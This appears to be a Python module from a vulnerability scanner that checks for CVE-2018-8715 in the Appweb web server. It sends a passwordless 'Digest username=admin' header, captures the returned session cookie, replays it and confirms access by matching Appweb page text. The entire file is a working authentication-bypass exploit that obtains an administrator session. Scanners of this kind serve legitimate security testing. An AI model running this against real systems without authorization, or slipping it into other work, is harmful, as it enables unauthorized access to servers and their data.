#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

def cve_2018_8715_scan(self, url):
    ''' 其7.0.3之前的版本中, 有digest和form两种认证方式, 
            如果用户传入的密码为null(也就是没有传递密码参数)
            appweb将因为一个逻辑错误导致直接认证成功, 并返回session
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'unAuthorized'
    vul_info['vul_id'] = 'CVE-2018-8715'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {
        'Authorization': 'Digest username=admin'
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2018_8715_payloads:
        path = payload['path']
        data = payload['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res1 = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False
            )
            logger.logging(vul_info, res1.status_code, res1)                        # * LOG

            if ((res1.status_code == 200) and ('Set-Cookie' in res1.headers)):
                try:
                    cookie = {
                        'Cookie': res1.headers['Set-Cookie']
                    }
                    headers.update(cookie)
                except KeyError:
                    continue
            
                res2 = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res2.status_code, res2)                        # * LOG
            else:
                return None


            # todo 判断
            if (('401' not in res2.text) 
                and (('The Fast, Little Web Server' in res2.text) 
                     or ('Quick Start' in res2.text) 
                     or ('Appweb Resources and Useful Links' in res2.text) 
                     or ('Thanks, Embedthis Team.' in res2.text))):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Cookie': cookie['Cookie']
                    }
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
